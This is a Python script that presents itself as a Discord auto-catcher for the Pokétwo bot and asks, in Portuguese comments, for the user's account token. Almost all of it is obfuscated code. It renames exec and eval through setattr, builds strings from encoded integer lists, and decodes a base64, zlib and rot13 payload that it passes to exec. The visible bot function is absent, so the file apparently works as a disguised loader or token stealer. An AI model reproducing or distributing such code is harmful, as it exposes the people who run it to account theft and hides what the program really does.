import os
import random ,base64,codecs,zlib,sys;py=""
sys.setrecursionlimit(1000000000) 
os.system('pip install pycryptodome')

TOKEN = "seu_token" # O token da conta onde o auto catcher irá funcionar
CAPTCHA_CHANNEL_id = id_aqui # O ID do canal que você deseja ser avisado quando o poketwo
solicitar captcha ao bot
PREFIX = "prefix" # O Prefixo dos comandos (ex.: !, $, +, ., etc.)

pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'TimeoutError / complex','exec':'Aq9EnEkRtg5ffxE4oTrKZPdDJUulr2uM7ScXbvOJd2Shalq8oB50cXMQ3M40Euiwh1PyLbfaj3aXgOzF','eval': bytes.fromhex('''3646d472d375b319e01c6c5ee877ce833864e34e0cacded19c5072c7a4a9cf197beb832e6c20c8873627f8bde193405b28daefecc9955f81a1418f7445a837a6832a66c525177e1287ed5505f5c897a8c8caf500f1cfaf00e8244a777deea407a408dbf1e992ff038459f485178cbd9e461e0d23a3ca45c83341161bcda7ada3e0aca2ca7f789a03e7593554b7247757b8fa27c9be1cba94378a1e53c206c3b0ee7e73c1e81673981ca061d4b02944b59495fc077f038de6c55e1dc0ac64407196121680b8ef6136e23070bfb86804b294c568dab54c96521bd1ea71aee99047839d410d58bfdb6e0520e9decc8d54ec6cdc5bd6a416b150e25034803dc8c04dc0490a4e3c26145504347c52af38c7f155e89eb0757a85a314d64823f94725d451ad64b6f1418bd37b9d1e35f140bfc4778b27bae44e8dc802a8b55a02d45fbaceb2838f074e60789d8880f0a5262468535b91497d17cc6a230d3c18c3a042fad543cd2de0983e554110e25ed19d7718da7660cb8b11d38638e29db62aa773d97a513bad1f80abd8075f514d4eb0b9d94896217c05fe2e07f45dbbba66a93bccfc220719f3cb56c8b9cf314548959080ccfafedfc43787f6a46afcb39a85c9d86f49bce4239397fd4d3b22764493a9e0abdb2e70fb20f3b2bffaf1ccab84f71779c27f3fd47add553f63394d392c11debf0f4d030d57b6b71a920b9b85e2fb3ae021dab6c5d0c11cc3e97abcfdfc21a1a2b6d4e41493213a56334e1e38dc6bb3b73ebf787c647945bcc965f627455346f1e3fae26f726072bc44c0882298b6a0176d0b22f8c6e2874aa2bd701321bfd1f51a31b557aad55d89da679dec617829c48464b0ef948db702be383af5f82d01c271b2359f733320b59a9841735f4f4b60ac961b020e457900a36c9d96b83af50af9b692a23fda4d8eacd2159bf515d71c8493dd362fd80f200aed66bfdd0bc2b7a909faede6356de39b826bc979f5905f204248d2a5a6bd302733c11cbc53c7a014fdb8289470018abd76315a9f654fbed4e3c01e20fb57be3bd34dbcf06dc008e38833a60e9bb11c81e2355df2836e0c95545479a899bac2f9c1e7f36959a90e9ee2c167b479168dfd803c6e27f96f9c61a050f2d9b430a93333baef4382be107d3d02ee933b2c421331271dc48807d6f47144e350832341aac884d76a7db081ac8d068c00a2634ef2ab48770c0787931e2f3f7b801d8e7b24f93004b58253dabd9bc153bfe9e3c6f4c457abefc9728e6a98bb6cded598eda76729deddf17ecd6a017634cdc9fd4c1d0a637de916a30c4d351dd7296dc3f0a4ba434427afad12499c89de98dfb5217bb6845a85fbec56349099921d7ef27385d124f364d300a32078a39ee5a07d26b2db986e1e36bd79e9cec1a70546c614738f3fcd41dcc55376cc2b53fc8d3b86cfe64e90375a9bee109f18a26e6dbc3649dee26d8a07f333ec1a09c5a38c0cdd35dc65b42f18478263d8cf2eca9aafa80713dac5a735007fee34241417ca16de4c77d369e03305307e481472aeb892392eabb71e0fb9dd898f91a896e45d098bc7bc59676cf3def37bc6370f47bd412893099096e483c932594d46fb3508935a22c4d26fb30fb29e5740fb1662efa48b94c97eb5ed1967243a31c748eaacb38ed36e6ca7ad05d01fa204ea8173c574eb31599b5fda906b2781cc0c47f1cefb03900664d6e59400db10d8d25e8bbe70d47436d990accd232f44e7d266c09f0f49afa6f3fcba783b329106a5e5947aa1f15f6cf6b3960703a83d129354e8c26741b3b8e435fc2c1d1b25ae4bafa679a494b77238890e498a5dae6c25eecee6a479583dae6a5e924a67af91eb1a8a47c2c5220929d86e930883e52803ea74b751184b710a00346150b2e157e2e4db3ef1bbbe6326da1bc27c3f301f5a26313bbf93b596f16f87a969eec414b4f57a8a916fbd9a52fa17e03ae96564ee5000d3192d2b6313acf0c5cae974362d31020e887e09f996a9dc10c36e7721e66d0f6a0cf78c807d47838542d0fbdebe0f81cb732d2d5b9a1c201059a22154d94cb3775ae6b9034fdcdf0947d5774eb6321bcb937862bc6e1d36de500492c8314a00b7bcd4741d263c95e9182be123b47327c9c0055093a6466929ec60cc96cbc66cc4c7732d9af173232b5d471c7aac97eb322b3c6093b6ed1805b9d3c979597fa9fb9648619c547fdc045b750d342a4e5d78c5619ba479d20af2bb42c27bbaa2efeb0c7957fc7d5ec5c0ee21bec5fc35a7d5dcf789a19db27422f2a7b778426fc50ef58dbb8e0052a3ebbba653c3334dec6ac4e48a3f8b13b05855b8dcc471ce487b3bf5dc078e19684749c370a54df1b51459c9d115e9a8c87bedfb0976f3bbd5f75e4b866b8f0b74cbb86f57e2f16abe22ea6f63d97428ba1e4f420fcdc610ea05351e584bb62d4be614e0efa0411937f8fa29e51ffed827cd512ae62b37a9af17c0f1df151db3e0688f1a0b7bffc23327f5853fd2a9a3b4f1fc988a02c8aa5e17f936614e9d41b6bb80ec2675117ba77ff7009638a0dc1aa1d4715f16915184112b3f8e131160c38ff8f2a6a3b641a3eb700e3ec06835da80ccdb16a4be8dce082edfe6dcdb68a32e7cddde9f49d1a0c5f5b5591436a1a0e655932f7ef8b27aa0de96c8e16ec85550f073c3f14d1f99f2ee1579ce403e02218f4ba5e3de33cfcd3e945ceac6ced4bd984fe1b9a5696f8c55e034636d66f4fb329e80d34df4f02e3d0302a63ec3b6ac901e2ec14c7e910cd527f9a3206ee07503703f0120176f5752a22f9ddad1a72404a80cbbb686fe4f8e6b95d898aa132f31b493b86ce052e1e24e3d4e61c0b085dc3ed4551e8c2795343a650bc8a97807d25b8e56a7f7dcdc181f1bc53b68f9f1b9da2503caa3ae24d13ddc61a37fbd6e422424cc548cc6e2ed6b205b4bcf5d634887c2f01e4f5a13f10a6b04efa092f6b20609af2312583163a5455be1be6c83b88f5377dc2cf6cae21f85055d603782043dd0eee07357a8a088d0b331c954f68ed82da2a474cac93eb0c6b548ed8711e98455a042a0c568571ab281070dd41a3cf0a27efec2b738569923046cc73403e4e0db8cf50112f9b503ebab98398f9577516707d02accbce996eebd44d8a9df990ecee90c0c5eeb8d9411b6a1d79870d883b023fcc04a5be7895b15c981beedce1d91b319e8e6e9df4e9488b330e03700868284b28abe50a94e134e760ac2bb52bd3f1e56e4a74b5275b9b4184bae5d4e4d6a083a49b7945e8bb65e7ead18f122d10bd891ab88a31080e89aff1e1596d785295db8940dbd4061d5cdaa2c09e28a350f7443ef4b4722b673ac1d48ed5fd331cb59bb9880479ef40fc20acd422909fb0c4f7d23943c82ddf8c88ac69521e07f1d051cb5063d7ad10d73c57eb3642239c04e0aace1fed0b1377c400e7d23473808e88f86d04b8555dfc171286b4dfd7c3de94925d9ee47f537778f8a34ac33265a60ab0e0807b39fd97441b9368125ae57f5bb08e02563ca2d0afbc71894f0bab65b42
af839526d291d8da8016427a43976898c6a2cfad2b406ea12600226ad8a5fd6597a057f4d359e889c962e1b39e6c83bf999bbb9b940dd3d7ec55ca74d5f3ff105cb38c0148bbdff13d947876cbef5bb914d42e0e4efed9119bf26c141dda48fc97bc3711e481a91802d530c362eed0a80d36b35fdd2814bec695344772554f98375a749e0d36ac1146fbcf877f0853f8ab2d102147cbea729c37078a2c4f79df65f2c5a69f286cec95891d0f2264477b5e6ba9da619de24646e34757'''.replace("\n","")) })

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')


